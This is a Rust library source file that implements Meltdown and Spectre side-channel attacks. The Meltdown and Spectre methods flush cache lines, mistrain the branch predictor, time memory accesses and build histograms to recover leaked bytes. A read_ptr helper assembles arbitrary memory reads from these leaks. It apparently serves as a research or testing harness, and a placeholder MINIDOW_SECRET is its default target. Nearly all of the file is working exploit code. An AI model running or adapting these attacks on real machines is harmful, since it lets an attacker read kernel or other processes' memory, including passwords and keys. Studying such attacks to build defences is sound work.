#![feature(asm)]
#![no_std]

#[cfg(feature = "tester")]
use core::num::Wrapping;

#[cfg(feature = "std")]
extern crate std;

mod util;
pub use crate::util::*;

pub const MULTIPLE_OFFSET: usize = 8192;
pub const CACHE_LINE_SIZE: usize = 4096;
pub const NB_CYCLES_TRAIN: u64 = 1000;
pub const NB_TIMES: usize = 1000;
pub const ZERO_TRESHOLD: usize = 998;

#[cfg(feature = "tester")]
pub static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096] =
    [0; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096];
#[cfg(feature = "tester")]
pub static mut LATENCIES: [u64; 256] = [0; 256];

#[cfg(feature = "tester")]
pub static mut BASE_ADDR: usize = 0;
#[cfg(feature = "tester")]
pub static mut MIN_NB_CYCLES: u64 = 0;
#[no_mangle]
pub static mut SPECTRE_LIMIT: u64 = 16;
#[no_mangle]
pub static MINIDOW_SECRET: &[u8; 128] =
    b"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001234";

#[cfg(feature = "tester")]
pub trait Method {
    fn nb_cycles_offset(&self) -> u64 {
        return 0;
    }

    unsafe fn perform(
        &self,
        preload_op: unsafe fn(),
        target_address: *const u8,
        dest_array: &mut [u8],
    );
}

#[cfg(feature = "tester")]
pub struct Meltdown;

#[cfg(feature = "tester")]
impl Method for Meltdown {
    unsafe fn perform(
        &self,
        preload_op: unsafe fn(),
        target_address: *const u8,
        dest_array: &mut [u8],
    ) {
        for i in 0..dest_array.len() {
            let mut histogram = [0usize; 256];

            for _ in 0..NB_TIMES {
                // load the data that must be accessed in cache
                preload_op();

                flush_measurement_area(BASE_ADDR);

                repeat_move_for_training_meltdown();

                access_memory(BASE_ADDR, target_address as usize + i);

                let leaked_byte = measure_byte(self).unwrap_or(0);
                histogram[leaked_byte as usize] += 1;
            }

            dest_array[i] = if histogram[0] > ZERO_TRESHOLD {
                //println!("{:?}", histogram);
                0
            } else {
                histogram[1..]
                    .iter()
                    .enumerate()
                    .max_by(|(_, x), (_, y)| x.cmp(y))
                    .map(|(x, _)| x as u8 + 1)
                    .unwrap()
            };
        }
    }
}

#[cfg(feature = "tester")]
pub struct Spectre {
    pub nb_cycles_offset: u64,
    training_func: unsafe extern "C" fn(base_addr: usize, off: usize),
    target_func: unsafe extern "C" fn(base_addr: usize, off: usize),
    spectre_speculation_base: *const i8,
    spectre_limit_addr: *const u8,
}

#[cfg(feature = "tester")]
impl Spectre {
    pub fn new(
        training_func: Option<unsafe extern "C" fn(base_addr: usize, off: usize)>,
        target_func: Option<unsafe extern "C" fn(base_addr: usize, off: usize)>,
        spectre_speculation_base: Option<*const i8>,
        spectre_limit_addr: Option<*const u8>,
    ) -> Self {
        Self {
            nb_cycles_offset: 25,
            training_func: training_func.unwrap_or(access_memory_spectre),
            target_func: target_func.unwrap_or(access_memory_spectre),
            spectre_speculation_base: spectre_speculation_base
                .unwrap_or(&MINIDOW_SECRET[64] as *const _ as *const i8),
            spectre_limit_addr: spectre_limit_addr
                .unwrap_or(unsafe { &SPECTRE_LIMIT as *const _ as *const u8 }),
        }
    }
}

#[cfg(feature = "tester")]
impl Method for Spectre {
    fn nb_cycles_offset(&self) -> u64 {
        self.nb_cycles_offset
    }

    unsafe fn perform(
        &self,
        preload_op: unsafe fn(),
        target_address: *const u8,
        dest_array: &mut [u8],
    ) {
        let target = (Wrapping(target_address as usize)
            - Wrapping(self.spectre_speculation_base as usize))
        .0;
        let limit = SPECTRE_LIMIT as usize;
        let base_addr = BASE_ADDR;

        for i in 0..dest_array.len() {
            let mut histogram = [0; 256];
            for _ in 0..2 * NB_TIMES {
                // training phase
                for i in 0..50_000 {
                    (self.training_func)(base_addr, i % limit);
                }

                // attack phase
                flush_measurement_area(base_addr);
                core::arch::x86_64::_mm_clflush(self.spectre_speculation_base as *mut u8);
                core::arch::x86_64::_mm_clflush(self.spectre_limit_addr);

                preload_op();
                asm!("mfence", "lfence");

                (self.target_func)(base_addr, target + i);

                histogram[measure_byte(self).unwrap_or(0) as usize] += 1;
            }
            dest_array[i] = if histogram[0] == 2 * NB_TIMES {
                0
            } else {
                histogram[1..]
                    .iter()
                    .enumerate()
                    .max_by(|(_, x), (_, y)| x.cmp(y))
                    .map(|(x, _)| x as u8 + 1)
                    .unwrap()
            };
        }
    }
}

#[cfg(feature = "tester")]
pub fn read_ptr<M: Method>(method: &M, preload_op: unsafe fn(), target_adress: usize) -> usize {
    let mut arr = [0; 8];
    unsafe { method.perform(preload_op, target_adress as *const u8, &mut arr) };
    arr.iter()
        .enumerate()
        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
}
